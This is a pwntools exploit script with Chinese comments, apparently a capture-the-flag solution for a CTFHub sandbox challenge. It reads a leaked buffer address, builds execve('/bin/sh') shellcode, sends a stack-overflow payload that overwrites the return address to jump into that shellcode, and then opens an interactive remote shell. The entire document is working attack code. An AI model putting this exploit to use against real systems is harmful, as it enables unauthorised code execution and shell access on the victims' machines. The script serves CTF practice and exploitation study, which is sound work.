from pwn import *

context.arch = 'amd64'  # 64位程序
p = remote('challenge-5e1961ab030988ef.sandbox.ctfhub.com', 38167)  # 替换为实际目标

# 1. 获取泄露的 buf 地址
p.recvuntil(b"[")
buf_addr = int(p.recvuntil(b"]", drop=True), 16)
log.success(f"buf address: {hex(buf_addr)}")

# 2. 生成 Shellcode（调用 execve("/bin/sh")）
shellcode = asm(shellcraft.sh())
shellcode_addr=buf_addr + 32  # shellcode  buf和rbp的偏移量是16+rbp的偏移量8+返回地址8=32

# 3. 构造 Payload
payload = b'a'*0x18+p64(shellcode_addr)+shellcode
# 4. 发送 Payload
p.send(payload)
p.interactive()  # 获取交互式 shell


